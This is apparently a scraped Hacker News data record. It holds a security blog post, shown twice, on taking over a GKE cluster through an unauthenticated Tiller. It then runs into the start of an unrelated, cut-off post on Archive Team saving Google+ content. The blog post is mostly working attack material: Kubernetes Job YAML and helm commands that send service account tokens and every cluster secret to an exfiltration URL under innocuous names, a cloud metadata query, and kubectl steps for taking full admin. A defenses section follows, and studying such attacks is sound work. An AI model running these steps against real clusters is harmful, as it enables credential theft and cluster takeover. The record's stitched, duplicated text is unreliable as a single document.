kind: Job metadata: name: tiller-deployer # something benign looking namespace: kube-system spec: template: spec: serviceAccountName: tiller # hardcoded service account name containers: - name: tiller-deployer # something benign looking image: byrnedo/alpine-curl command: [\"curl\"] args: [\"-d\", \"@/var/run/secrets/kubernetes.io/serviceaccount/token\", \"$(EXFIL_URL)\"] env: - name: EXFIL_URL value: \"https://<listening_url>\" # replace URL here restartPolicy: Never backoffLimit: 5 Of course, since we dont hace access to the Kubernetes API directly and are using Helm, we cant just send this YAML - we have to send a Chart. Ive created a chart to run the above job: https://github.com/ropnop/pentest_charts/tree/master/charts/exfil_sa_token This chart is also packaged up and served from a Chart Repo here: https://ropnop.github.io/pentest_charts/ This Chart takes a few values: name - the name of the release, job and pod. Probably best to call it something benign looking (e.g. tiller-deployer) serviceAccountName - the service account to use (and therefore the token that will be exfild) exfilURL - the URL to POST the token to. Make sure you have a listener on that URL to catch it! (I like using a serverless function to dump to Slack) namespace - defaults to kube-system, but you can override it To deploy this chart and exfil the tiller service account token, we have to first initialize Helm in our pod: 1 2 $ export HELM_HOME=/tmp/helmhome $ /tmp/helm init --client-only Once it initializes, we can deploy the chart directly and pass it the values via command line: 1 2 3 4 5 $ export HELM_HOST=tiller-deploy.kube-system.svc.cluster.local:44134 $ /tmp/helm install --name tiller-deployer \\ --set serviceAccountName=tiller \\ --set exfilURL=\"https://datadump-slack-dgjttxnxkc.now.sh\" \\ --repo https://ropnop.github.io/pentest_charts exfil_sa_token Our Job was successfully deployed: And I got the tiller service account token POSTed back to me in Slack :) After the job completes, its easy to clean up everything and delete all the resources with Helm purge: 1 $ /tmp/helm delete --purge tiller-deployer Stealing all secrets from Kubernetes While you can always use the exfil_sa_token chart to steal service account tokens, its predicated on one thing: you know the name of the service account. In the above case, an attacker would have to pretty much guess that the service account name was tiller, or the attack wouldnt work. In this scenario, since we dont have access to the Kubernetes API to query service accounts, and we cant look it up through Tiller, theres no easy way to just pull out a service account token if it has a unique name. The other option we have though, is to use Helm to create a new, highly privileged service account, and then use that to extract all the other Kubnernetes secrets. To accomplish that, we create a new ServiceAccount and ClusterRoleBinding then attach it to a new job that extracts all Kubernetes secrets via the API. The YAML definitions to do that would look something like this: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 --- apiVersion: v1 kind: ServiceAccount metadata: name: tiller-deployer #benign looking service account namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: tiller-deployer roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-admin # full cluster-admin privileges subjects: - kind: ServiceAccount name: tiller-deployer namespace: kube-system --- apiVersion: batch/v1 kind: Job metadata: name: tiller-deployer # something benign looking namespace: kube-system spec: template: spec: serviceAccountName: tiller-deployer # newly created service account containers: - name: tiller-deployer # something benign looking image: rflathers/kubectl:bash # alpine+curl+kubectl+bash command: - \"/bin/bash\" - \"-c\" - \"curl --data-binary @<(kubectl get secrets --all-namespaces -o json) $(EXFIL_URL)\" env: - name: EXFIL_URL value: \"https://<listening_url>\" # replace URL here restartPolicy: Never In the same vein as above, I packaged the above resources into a Helm chart: https://github.com/ropnop/pentest_charts/tree/master/charts/exfil_secrets This Chart also takes the same values: name - the name of the release, job and pod. Probably best to call it something benign looking (e.g. tiller-deployer) serviceAccountName - the name of the cluster-admin service account to create and use (again, use something innocuous looking) exfilURL - the URL to POST the token to. Make sure you have a listener on that URL to catch it! (I like using a serverless function to dump to Slack) namespace - defaults to kube-system, but you can override it When this chart is installed, it will create a new cluster-admin service account, then launch a job using that service account to query for every secret in all namespaces, and dump that data in a POST body back to EXFIL_URL. Just like above, we can launch this from our compromised pod: 1 2 3 4 5 6 7 $ export HELM_HOST=tiller-deploy.kube-system.svc.cluster.local:44134 $ export HELM_HOME=/tmp/helmhome $ /tmp/helm init --client-only $ /tmp/helm install --name tiller-deployer \\ --set serviceAccountName=\"tiller-deployer\" \\ --set exfilURL=\"https://datadump-slack-dgjttxnxkc.now.sh/all_secrets.json\" \\ --repo https://ropnop.github.io/pentest_charts exfil_secrets After Helm installs the chart, well get every Kubernetes secret dumped back to our exfil URL (in my case posted in Slack) And then make sure to clean up and remove the new service account and job: 1 $ /tmp/helm delete --purge tiller-deployer With the secrets in JSON form, you can use jq to extract out plaintext passwords, tokens and certificates: 1 cat all_secrets.json | jq '[.items[] | . as $secret| .data | to_entries[] | {namespace: $secret.metadata.namespace, name: $secret.metadata.name, type: $secret.type, created: $secret.metadata.creationTimestamp, key: .key, value: .value|@base64d}]' And searching through that you can find the service account token tiller uses: Using service account tokens Now armed with Tillers service account token, we can finally directly talk to the Kubernetes API from within our compromised pod. The token value needs to be added as a header in the request: Authorization: Bearer <token_here> 1 2 $ export TOKEN=\"eyJhb...etc...\" $ curl -k -H \"Authorization: Bearer $TOKEN\" https://10.7.240.1:443/ Working from within the cluster is annoying though, since it is always going to require us to execute commands from our compromised pod. Since this is a GKE cluster, we should be able to access the Kubernetes API over the internet if we find the correct endpoint. For GKE, you can pull data about the Kubernetes cluster (including the master endpoint) from the Google Cloud Metadata API from the compromised pod: 1 2 $ curl -s -kH \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env | grep KUBERNETES_MASTER_NAME KUBERNETES_MASTER_NAME: 104.154.18.15 Armed with the IP address and Tillers token, you can then configure kubectl from anywhere to talk to the GKE cluster on that endpoint: 1 2 3 4 5 $ kubectl config set-cluster pwnedgke --server=https://104.154.18.15 $ kubectl config set-credentials tiller --token=$TILLER_TOKEN $ kubectl config set-context pwnedgke --cluster pwnedgke --user tiller $ kubectl config use-context pwnedgke $ kubectl --insecure-skip-tls-verify cluster-info Note: Im skipping TLS verify because I didnt configure the cluster certificate For example, lets take over the GKE cluster from Kali: And thats it - we have full admin control over this GKE cluster :) There is a ton more we can do to maintain persistence (especially after dumping all the secrets previously), but that will remain a topic for future posts. Defenses This entire scenario was created to demonstrate how the default installation of Helm and Tiller (as well as GKE) can make it really easy for an attacker to escalate privileges and take over the entire cluster if a pod is compromised. If you are considering using Helm and Tiller in production, I strongly recommend following everything outlined here: https://github.com/helm/helm/blob/master/docs/securing_installation.md mTLS should be configured for Tiller, and RBAC should be as locked down as possible. Or dont create a Tiller service and require admins to do manual port forwards to the pod. Or ask yourself if you really need Tiller at all - I have seen more and more organizations simply abandon Tiller all together and just use Helm client-side for templating. For GKE, Google has a good writeup as well on securing a cluster for production: https://cloud.google.com/solutions/prep-kubernetes-engine-for-prod. Using VPCs, locking down access, filtering metadata, and enforcing network policies should be done at a minimum. Sadly, a lot of these security controls are hard to implement, and require a lot more effort and research to get right. Its not surprising to me then that a lot of default installations still make their way to production. Hope this helps someone! Let me know if you have any questions or want me to focus on anything more in the future. Im hoping this is just the first of several Kubernetes related posts. -ropnop See also Docker for Pentesters Serverless Toolkit for Pentesters Extracting SSH Private Keys From Windows 10 ssh-agent SANS Holiday Hack 2017 Writeup Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM) ",
          "I think we are going to start seeing quite a lot more 'k8s is insecure' posts in the future (not that we haven't seen quite a bit this past year alone).",
          "Helm 3 removes the server side component and it inherits permissions from your .kube/config.    It is in beta now, I really need to give it a spin."
        ],
        "story_type": ["Normal"],
        "url": "https://blog.ropnop.com/attacking-default-installs-of-helm-on-kubernetes/",
        "comments.comment_id": [21062147, 21066386],
        "comments.comment_author": ["dgoog", "colek42"],
        "comments.comment_descendants": [1, 1],
        "comments.comment_time": [
          "2019-09-24T16:51:23Z",
          "2019-09-25T00:41:27Z"
        ],
        "comments.comment_text": [
          "I think we are going to start seeing quite a lot more 'k8s is insecure' posts in the future (not that we haven't seen quite a bit this past year alone).",
          "Helm 3 removes the server side component and it inherits permissions from your .kube/config.    It is in beta now, I really need to give it a spin."
        ],
        "id": "20b45325-0028-4bfc-a16b-2529877ced04",
        "url_text": "Intro I have totally fallen down the Kubernetes rabbit hole and am really enjoying playing with it and attacking it. One thing Ive noticed is although there are a lot of great resources to get up and running with it really quickly, there are far fewer that take the time to make sure its set up securely. And a lot of these tutorials and quick-start guides leave out important security options for the sake of simplicity. In my opinion, one of the biggest offenders of this is Helm, the package manager for Kubernetes. There are countless tutorials and Stack Overflow answers that completely gloss over the security recommendations and take steps that really put the entire cluster at risk. More and more organizations Ive talked to recently actually seem to be ditching the cluster side install of Helm (Tiller) entirely for security reasons, and I wanted to explore and explain why. In this post, Ill set up a default GKE cluster with Helm and Tiller, then walk through how an attacker who compromises a running pod could abuse the lack of security controls to completely take over the cluster and become full admin. tl;dr The simple way to install Helm requires cluster-admin privileges to be given to its pod, and then exposes a gRPC interface inside the cluster without any authentication. This endpoint allows any compromised pod to deploy arbitrary Kubernetes resources and escalate to full admin. I wrote a few Helm charts that can take advantage of this here: https://github.com/ropnop/pentest_charts Disclaimer This post in only meant to practically demonstrate the risks involved in not enabling the security features for Helm. These are not vulnerabilities in Helm or Tiller and Im not disclosing anything previously unknown. My only hope is that by laying out practical attacks, people will think twice about configuring loose RBAC policies and not enabling mTLS for Tiller. Installing the Environment To demonstrate the attack, Im going to set up a typical web stack on Kubernetes using Google Kubernetes Engine (GKE) and Helm. Ill be installing everything using just the defaults as found on many write-ups on the internet. If you want to just get to the attacking part, feel free to skip this section and go directly to Exploiting a Running Pod Set up GKE Ive createad a new GCP project and will be using the command line tool to spin up a new GKE cluster and gain access to it: 1 2 3 4 5 $ gcloud projects create ropnop-helm-testing #create a new project $ gcloud config set project ropnop-helm-testing #use the new project $ gcloud config set compute/region us-central1 $ gcloud config set compute/zone us-central1-c $ gcloud services enable container.googleapis.com #enable Kubernetes APIs Now Im ready to create the cluster and get credentials for it. I will do it with all the default options. There are a lot of command line switches that can help lock down this cluster, but Im not going to provide any: 1 $ gcloud container clusters create ropnop-k8s-cluster After a few minutes, my cluster is up and running: Lastly, I get credentials and verify connectivity with kubectl: 1 2 $ gcloud container clusters get-credentials ropnop-k8s-cluster #set up kubeconfig $ kubectl config get-clusters And everything looks good, time to install Helm and Tiller Installing Helm+Tiller Helm has a quickstart guide to getting up and running with Helm quickly. This guide does mention that the default installation is not secure and should only be used for non-production or internal clusters. However, several other guides on the internet skip over this fact (example1, example2). And several Stack Overflow answers Ive seen just have copy/paste code to install Tiller with no mention of security. Again, Ill be doing a default installation of Helm and Tiller, using the easiest method. Creating the service account Since Role Based Access Control (RBAC) is enabled by default now on every Kubernetes provider, the original way of using Helm and Tiller doesnt work. The Tiller pod needs elevated permissions to talk the Kubernetes API. Fine grain controlling of service account permissions is tricky and often overlooked, so the easiest way to get up and running is to create a service account for Tiller with full cluster admin privileges. To create a service account with cluster admin privs, I define a new ServiceAccount and ClusterRoleBinding in YAML: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 apiVersion: v1 kind: ServiceAccount metadata: name: tiller namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: tiller roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-admin subjects: - kind: ServiceAccount name: tiller namespace: kube-system and apply it with kubectl: 1 $ kubectl apply -f tiller-rbac.yaml This created a service account called tiller, generated a secret auth token for it, and gave the account full cluster admin privileges. Initialize Helm The final step is to initialize Helm with the new service account. Again, there are additional flags that can be provided to this command that will help lock it down, but Im just going with the defaults: 1 $ helm init --service-account tiller Besides setting up our client, this command also creates a deployment and service in the kube-system namespace for Tiller. The resources are tagged with the label app=helm, so you can filter and see everything running: We can also see that the Tiller deployment is configured to use our cluster admin service account: 1 2 $ kubectl -n kube-system get deployments -l 'app=helm' -o jsonpath='{.items[0].spec.template.spec.serviceAccount}' tiller Installing Wordpress Now its time to use Helm to install something. For this scenario, Ill be installing a Wordpress stack from the official Helm repository. This is a pretty good example of how quick and powerful Helm can be. In one command we can get a full stack deployment of Wordpress including a persistent MySQL backend. 1 $ helm install stable/wordpress --name mycoolblog With no other flags, Tiller deploys all the resources into the default namespace. The name field gets applied as a release label on the resource, so we can view all the resources that were created: Helm took care of exposing the port for us too via a LoadBalancer service, so if we visit the external IP listed, we can see that Wordpress is indeed up and running: And thats it! Ive got my blog up and running on Kubernetes in no time. What could go wrong now? Exploiting a Running Pod From here on out, I am going to assume that my Wordpress site has been totally compromised and an attacker has gained remote code execution on the underlying pod. This could be through a vulnerable plugin I installed or a bad misconfiguration, but lets just assume an attacker got a shell. Note: for purposes of this scenario Im just giving myself a shell on the pod directly with the following command 1 $ kubectl exec -it mycoolblog-wordpress-5d6c7d5464-hl972 -- /bin/bash Post Exploitation After landing a shell, theres a few indicators that quickly point to this being a container running on Kubernetes: The file /.dockerenv exists - were inside a Docker container Various kubernetes environment variables Theres several good resources out there for various Kubernetes post-exploitation activities. I recommend carnal0wnages Kubernetes master post for a great round-up. Trying some of these techniques, though, well discover that the default GKE install is still fairly locked down (and updated against recent CVEs). Even though we can talk to the Kubernetes API, for example, RBAC is enabled and we cant get anything from it: Time for some more reconaissance Service Reconaissance By default, Kubernetes makes service discovery within a cluster easy through kube-dns. Looking at /etc/resolv.conf we can see that this pod is configured to use kube-dns: 1 2 3 nameserver 10.7.240.10 search default.svc.cluster.local svc.cluster.local cluster.local us-central1-c.c.ropnop-helm-testing.internal c.ropnop-helm-testing.internal google.internal options ndots:5 Our search domains tell us were in the default namespace (as well as inside a GKE project named ropnop-helm-testing). DNS names in kube-dns follow the format: <svc_name>.<namespace>.svc.cluster.local. Through DNS, for example, we can look up our MariaDB service that Helm created: 1 2 $ getent hosts mycoolblog-mariadb 10.7.242.104 mycoolblog-mariadb.default.svc.cluster.local (Note: Im using getent since this pod didnt have standard DNS tools installed - living off the land ftw :) ) Even though were in the default namespace, its important to remember that namespaces dont provide any security. By default, there are no network policies that prevent cross-namespace communication. From this position, we can query services that are running in the kube-system namespace. For example, the kube-dns service itself: 1 2 $ getent hosts kube-dns.kube-system.svc.cluster.local 10.7.240.10 kube-dns.kube-system.svc.cluster.local Through DNS, its possible to enumerate running services in other namespaces. Remember how Tiller created a service in kube-system? Its default name is tiller-deploy. If we checked for that via a DNS lookup wed see it exists and exactly where its at: Great! Tiller is installed in this cluster. How can we abuse it? Abusing tiller-deploy The way that Helm talks with a kubernetes cluster is over gRPC to the tiller-deploy pod. The pod then talks to the Kubernetes API with its service account token. When a helm command is run from a client, under the hood a port forward is opened up into the cluster to talk directly to the tiller-deploy service, which always points to the tiller-deploy pod on TCP 44134. What this means is that for a user outside the cluster, they must have the ability to open port forwards into the cluster since port 44134 is not externally exposed. However, from inside the cluster, 44134 is available and the port forward is not needed. We can verify that the port is open by simply tryint to curl it: Since we didnt get a timeout, something is listening there. Curl fails though, since this endpoint is designed to talk gRPC, not HTTP. Knowing we can reach the port, if we can send the right messages, we can talk directly to Tiller - since by default, Tiller does not require any authentication for gRPC communication. And since in this default install Tiller is running with cluster-admin privileges, we can essentially run cluster admin commands without any authentication. Talking gRPC to Tiller All of the gRPC endpoints are defined in the source code in Protobuf format, so anyone can create a client to communicate to the API. But the easiest way to communicate with Tiller is just through the normal Helm client, which is a static binary anyway. On our compromised pod, we can download the helm binary from the official releases. To download and extract to /tmp: 1 2 export HVER=v2.11.0 #you may need different version curl -L \"https://storage.googleapis.com/kubernetes-helm/helm-${HVER}-linux-amd64.tar.gz\" | tar xz --strip-components=1 -C /tmp linux-amd64/helm Note: You may need to download specific versions to match up the version running in the server. Youll see error messages telling you what version to get. The helm binary allows us to specify a direct address to Tiller with --host or with the HELM_HOST environment variable. By plugging in the discovered tiller-deploy services FQDN, we can directly communicate with the Tiller pod and run arbitrary Helm commands. For example, we can see our previously installed Wordpress release! From here, we have full control of Tiller. We can do anything a cluster admin could normally do with Helm, including installing/upgrading/deleting releases. But we still cant directly talk to the Kubernetes API, so lets abuse Tiller to upgrade our privileges and become full cluster admin. Stealing secrets with Helm and Tiller Tiller is configured with a service account that has cluster admin privileges. This means that the pod is using a secret, privileged service token to authenticate with the Kubernetes API. Service accounts are generally only used for non-human interactions with the k8s API, however anyone in possession of the secret token can still use it. If an attacker compromises Tillers service account token, he or she can execute any Kubernetes API call with full admin privileges. Unfortunately, the Helm API doesnt support direct querying of secrets or other resources. Using Helm, we can only create new releases from chart templates. Chart templates are very well documented and allow us to template out custom resources to deploy to Kubernetes. So we just need to craft a resource in a way to exfiltrate the secret(s) we want. Stealing a service account token When the service account name is known, stealing its token is fairly straightforward. All that is needed is to launch a pod with that service account, then read the value from /var/run/secrets/kubernetes.io/serviceaccount/token, where the token value gets mounted at creation. Its possible to just define a job to read the value and use curl to POST it to a listening URL: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 apiVersion: batch/v1 kind: Job metadata: name: tiller-deployer # something benign looking namespace: kube-system spec: template: spec: serviceAccountName: tiller # hardcoded service account name containers: - name: tiller-deployer # something benign looking image: byrnedo/alpine-curl command: [\"curl\"] args: [\"-d\", \"@/var/run/secrets/kubernetes.io/serviceaccount/token\", \"$(EXFIL_URL)\"] env: - name: EXFIL_URL value: \"https://<listening_url>\" # replace URL here restartPolicy: Never backoffLimit: 5 Of course, since we dont hace access to the Kubernetes API directly and are using Helm, we cant just send this YAML - we have to send a Chart. Ive created a chart to run the above job: https://github.com/ropnop/pentest_charts/tree/master/charts/exfil_sa_token This chart is also packaged up and served from a Chart Repo here: https://ropnop.github.io/pentest_charts/ This Chart takes a few values: name - the name of the release, job and pod. Probably best to call it something benign looking (e.g. tiller-deployer) serviceAccountName - the service account to use (and therefore the token that will be exfild) exfilURL - the URL to POST the token to. Make sure you have a listener on that URL to catch it! (I like using a serverless function to dump to Slack) namespace - defaults to kube-system, but you can override it To deploy this chart and exfil the tiller service account token, we have to first initialize Helm in our pod: 1 2 $ export HELM_HOME=/tmp/helmhome $ /tmp/helm init --client-only Once it initializes, we can deploy the chart directly and pass it the values via command line: 1 2 3 4 5 $ export HELM_HOST=tiller-deploy.kube-system.svc.cluster.local:44134 $ /tmp/helm install --name tiller-deployer \\ --set serviceAccountName=tiller \\ --set exfilURL=\"https://datadump-slack-dgjttxnxkc.now.sh\" \\ --repo https://ropnop.github.io/pentest_charts exfil_sa_token Our Job was successfully deployed: And I got the tiller service account token POSTed back to me in Slack :) After the job completes, its easy to clean up everything and delete all the resources with Helm purge: 1 $ /tmp/helm delete --purge tiller-deployer Stealing all secrets from Kubernetes While you can always use the exfil_sa_token chart to steal service account tokens, its predicated on one thing: you know the name of the service account. In the above case, an attacker would have to pretty much guess that the service account name was tiller, or the attack wouldnt work. In this scenario, since we dont have access to the Kubernetes API to query service accounts, and we cant look it up through Tiller, theres no easy way to just pull out a service account token if it has a unique name. The other option we have though, is to use Helm to create a new, highly privileged service account, and then use that to extract all the other Kubnernetes secrets. To accomplish that, we create a new ServiceAccount and ClusterRoleBinding then attach it to a new job that extracts all Kubernetes secrets via the API. The YAML definitions to do that would look something like this: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 --- apiVersion: v1 kind: ServiceAccount metadata: name: tiller-deployer #benign looking service account namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: tiller-deployer roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-admin # full cluster-admin privileges subjects: - kind: ServiceAccount name: tiller-deployer namespace: kube-system --- apiVersion: batch/v1 kind: Job metadata: name: tiller-deployer # something benign looking namespace: kube-system spec: template: spec: serviceAccountName: tiller-deployer # newly created service account containers: - name: tiller-deployer # something benign looking image: rflathers/kubectl:bash # alpine+curl+kubectl+bash command: - \"/bin/bash\" - \"-c\" - \"curl --data-binary @<(kubectl get secrets --all-namespaces -o json) $(EXFIL_URL)\" env: - name: EXFIL_URL value: \"https://<listening_url>\" # replace URL here restartPolicy: Never In the same vein as above, I packaged the above resources into a Helm chart: https://github.com/ropnop/pentest_charts/tree/master/charts/exfil_secrets This Chart also takes the same values: name - the name of the release, job and pod. Probably best to call it something benign looking (e.g. tiller-deployer) serviceAccountName - the name of the cluster-admin service account to create and use (again, use something innocuous looking) exfilURL - the URL to POST the token to. Make sure you have a listener on that URL to catch it! (I like using a serverless function to dump to Slack) namespace - defaults to kube-system, but you can override it When this chart is installed, it will create a new cluster-admin service account, then launch a job using that service account to query for every secret in all namespaces, and dump that data in a POST body back to EXFIL_URL. Just like above, we can launch this from our compromised pod: 1 2 3 4 5 6 7 $ export HELM_HOST=tiller-deploy.kube-system.svc.cluster.local:44134 $ export HELM_HOME=/tmp/helmhome $ /tmp/helm init --client-only $ /tmp/helm install --name tiller-deployer \\ --set serviceAccountName=\"tiller-deployer\" \\ --set exfilURL=\"https://datadump-slack-dgjttxnxkc.now.sh/all_secrets.json\" \\ --repo https://ropnop.github.io/pentest_charts exfil_secrets After Helm installs the chart, well get every Kubernetes secret dumped back to our exfil URL (in my case posted in Slack) And then make sure to clean up and remove the new service account and job: 1 $ /tmp/helm delete --purge tiller-deployer With the secrets in JSON form, you can use jq to extract out plaintext passwords, tokens and certificates: 1 cat all_secrets.json | jq '[.items[] | . as $secret| .data | to_entries[] | {namespace: $secret.metadata.namespace, name: $secret.metadata.name, type: $secret.type, created: $secret.metadata.creationTimestamp, key: .key, value: .value|@base64d}]' And searching through that you can find the service account token tiller uses: Using service account tokens Now armed with Tillers service account token, we can finally directly talk to the Kubernetes API from within our compromised pod. The token value needs to be added as a header in the request: Authorization: Bearer <token_here> 1 2 $ export TOKEN=\"eyJhb...etc...\" $ curl -k -H \"Authorization: Bearer $TOKEN\" https://10.7.240.1:443/ Working from within the cluster is annoying though, since it is always going to require us to execute commands from our compromised pod. Since this is a GKE cluster, we should be able to access the Kubernetes API over the internet if we find the correct endpoint. For GKE, you can pull data about the Kubernetes cluster (including the master endpoint) from the Google Cloud Metadata API from the compromised pod: 1 2 $ curl -s -kH \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env | grep KUBERNETES_MASTER_NAME KUBERNETES_MASTER_NAME: 104.154.18.15 Armed with the IP address and Tillers token, you can then configure kubectl from anywhere to talk to the GKE cluster on that endpoint: 1 2 3 4 5 $ kubectl config set-cluster pwnedgke --server=https://104.154.18.15 $ kubectl config set-credentials tiller --token=$TILLER_TOKEN $ kubectl config set-context pwnedgke --cluster pwnedgke --user tiller $ kubectl config use-context pwnedgke $ kubectl --insecure-skip-tls-verify cluster-info Note: Im skipping TLS verify because I didnt configure the cluster certificate For example, lets take over the GKE cluster from Kali: And thats it - we have full admin control over this GKE cluster :) There is a ton more we can do to maintain persistence (especially after dumping all the secrets previously), but that will remain a topic for future posts. Defenses This entire scenario was created to demonstrate how the default installation of Helm and Tiller (as well as GKE) can make it really easy for an attacker to escalate privileges and take over the entire cluster if a pod is compromised. If you are considering using Helm and Tiller in production, I strongly recommend following everything outlined here: https://github.com/helm/helm/blob/master/docs/securing_installation.md mTLS should be configured for Tiller, and RBAC should be as locked down as possible. Or dont create a Tiller service and require admins to do manual port forwards to the pod. Or ask yourself if you really need Tiller at all - I have seen more and more organizations simply abandon Tiller all together and just use Helm client-side for templating. For GKE, Google has a good writeup as well on securing a cluster for production: https://cloud.google.com/solutions/prep-kubernetes-engine-for-prod. Using VPCs, locking down access, filtering metadata, and enforcing network policies should be done at a minimum. Sadly, a lot of these security controls are hard to implement, and require a lot more effort and research to get right. Its not surprising to me then that a lot of default installations still make their way to production. Hope this helps someone! Let me know if you have any questions or want me to focus on anything more in the future. Im hoping this is just the first of several Kubernetes related posts. -ropnop See also Docker for Pentesters Serverless Toolkit for Pentesters Extracting SSH Private Keys From Windows 10 ssh-agent SANS Holiday Hack 2017 Writeup Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM) ",
        "_version_": 1718527427888545793
      },
      {
        "story_id": [19407865],
        "story_author": ["danso"],
        "story_descendants": [90],
        "story_score": [170],
        "story_time": ["2019-03-16T14:06:56Z"],
        "story_title": "Saving of public Google+ content by the Archive Team has begun",
        "search": [
          "Saving of public Google+ content by the Archive Team has begun",
          "https://www.reddit.com/r/plexodus/comments/az285j/saving_of_public_google_content_at_the_internet/",
          "The archiving of public Google+ content to the Internet Archive by the ArchiveTeam has has begun.What does this mean, how does this affect you, and what can you do?TL;DR: Most public Google+ content should live on at the Internet Archive thanks to a fanatical bunch of volunteers, and you can help.The Internet ArchiveThe Internet Archive is a digital library with the stated mission of \"universal access to all knowledge\". Though often known for its Web archives, the \"Wayback Machine\", it also preserves texts, audio, video, software, and other formats. Think of the Wayback Machine as the Web's attic, or basement, or storage locker.https://www.archive.org/Wikipedia has a good article on the Internet Archive.The Archive TeamArchive Team is a loose collective of rogue archivists, programmers, writers and loudmouths dedicated to saving our digital heritage. Since 2009 this variant force of nature has caught wind of shutdowns, shutoffs, mergers, and plain old deletions - and done our best to save the history before it's lost forever.https://www.archiveteam.org/The Archive Team works closely with, but is not affiliated with the Internet Archive. It runs projects to save bits of Web history that appear likely to be lost. Past projects include Mozilla Addons, Tindeck, and UOL Forums (the \"Brazillian AOL\"), whilst present projects include Flickr and Tumblr, as well as several manual projects. The group maintains Deathwatch and Fire Drill lists of sites or platforms thought to be in peril or of significance.Archive Team have previously saved other social media site content, and have several on their watchlists, including larger sites such as YouTube, Facebook, CodeAcademy, LiveJournal, Reddit, Twitter, WikiLeaks, and Wikipedia. This group thinks big.Archive projects run using a tool called \"Warrior\", based on \"grabber\" scripts, which run in a virtual machine (VirtualBox, VMWare, or other virtualisation systems) on a desktop or server system. Current Warrior images are available online: https://www.archiveteam.org/index.php?title=WarriorMore on Warrior below under \"What can you do?\".There's an IRC channel on EFnet: irc://irc.efnet.org/#archiveteamAnd a subreddit: https://old.reddit.com/r/Archiveteam/The Google+ Archive ProjectArchive Team became aware that Google+ was shutting down in December of 2018. The G+MM / Plexodus effort became aware of Archive Team in January of 2019. We've been sharing information and planning over the past few months, including the copious information we've collected on Google+ size, activity, profiles, communities, and characteristics of the site and platform.There's a (not particularly up-to-date) Wiki page largely consisting of Google's shutdown announcements: https://www.archiveteam.org/index.php?title=Google%2BThe actual archive code lives on GitHub: https://github.com/ArchiveTeam/googleplus-grabThe more interesting project tracker, showing updates in realtime, is: http://tracker.archiveteam.org/googleplus/Note that this shows only 1/50th of the total project at a time. \"Items\" are sitemap subsets of 100 profiles, and 50 batches of 1,000 sitemaps at a time, each with about 680 or so items, will be processed over the course of this archival. The tracker shows the status only of the current batch. Total profiles archived are 50 batches * 1,000 sitemaps/batch * 680 items/sitemap * 100 profiles/item = 3.4 billion profiles, or the total number of Google+ profiles (as of March, 2017). There will be 34 million items, total, in the overall process.How does this affect you as a Google+ user?If you do absolutely nothing, there is a very good chance that much of your public Google+ content will be preserved by Archive Team, on the Internet Archive, and will be publicly visible there.If you do want this to happen ... you're in luck. Don't delete your Google+ content or profile and it should be saved.If you don't want this to happen, you can request removal of specific items through the Internet Archive's procedure: https://help.archive.org/hc/en-us/articles/360004716091-Wayback-Machine-General-Information and https://help.archive.org/hc/en-us/articles/360018138951-How-do-I-remove-an-item-page-from-the-site-If you want to help, keep reading.LimitationsThere are a few limitations to this project:Only public content that is presently available on Google+ is being included. Private posts, and any previously deleted content will not be saved. (Previously saved content that's since been deleted will be available.)Full post comments may not be archived. Google+ allows up to 500 comments per post, but only presents a subset of these as static HTML. It's not clear that long discussion threads will be preserved. Historically they have not been.Image and video content may not be preserved at full resolution. This will apply mostly to high-def image and video content, though photographers may want to be aware.Content archival is subject to the rate at which the project can proceed and any limitations imposed outside its control. From past experience, the Archive Team can suck in amazing amounts of data quickly, and general success is likely.What can you do to help?Contributions can be made in the way of funds or volunteering services, particularly as an archive Warrior, running an archive instance yourself.The Internet Archive is fueled by donations, which provide servers, disk, and bandwidth to receive and share content. It costs the Archive about $2,000 to host 1 terabyte of data:https://archive.org/donateDonate to the Archive Team directlyFor the most part, contributing to the Internet Archive is strongly encouraged, as they do the heavy lifting, but Archive Team has its own smaller contributions project:https://opencollective.com/archiveteamIf you have the technical resources and skills, run a Warrior instancePeople with access to large-scale storage and high-bandwidth network connections are especially appreciated.What you'll need:A desktop, server computer, or \"cloud\" hosted system(s),A Virtual Machine server, including VirtualBox, VMWare, Docker and Hyper-V.At least 60 GB of free disk space.At least TK of free memory.A sufficiently high-bandwidth connection. 100 Mb/s+ or better is recommended.Skills and understanding to run all of this.If you don't understand part or any of this or the referenced documentation, and cannot get up and running by yourself, we'll manage without you. Self-supporting volunteers are appreciated.Archive Warriors volunteer their time, resources, and services, there is no compensation. If you wish to solicit donations on your own, you may do so.There are a set of requirements for your Internet connection itself. Please do NOT run a Warrior instance if any of the following apply:No OpenDNS. No ISP DNS that redirects to a search page. Use non-captive DNS servers.No ISP connections that inject advertisements into web pages.No proxies. Proxies can return bad data. The original HTTP headers and IP address are needed for the WARC file.No content-filtering firewalls.No censorship. If you believe your country implements censorship, do not run a warrior.No Tor. The server may return an error page instead of content if they ban exit nodes.No free cafe wifi. Archiving your cafe's wifi service agreement repeatedly is not helpful.No VPNs. Data integrity is a very high priority for the Archive Team so use of VPNs with the official crawler is discouraged.We prefer connections from many public IP addresses if possible. (For example, if your apartment building uses a single IP address, we don't want your apartment banned.)There are additional information, instructions, troubleshooting, and guidance at the Archive Team Warrior Wiki page:https://www.archiveteam.org/index.php?title=ArchiveTeam_WarriorAnd on the googleplus-grab GitHub pagehttps://github.com/ArchiveTeam/googleplus-grabNote that Warrior utilises a specially [Lua](https://en.wikipedia.org/wiki/Lua_(programming_language)-instrumented version of wget to produce WARC images, a standard developed by the Internet Archive and very widely adopted, as the Library of Congress link above indicates.(The Internet Archive and 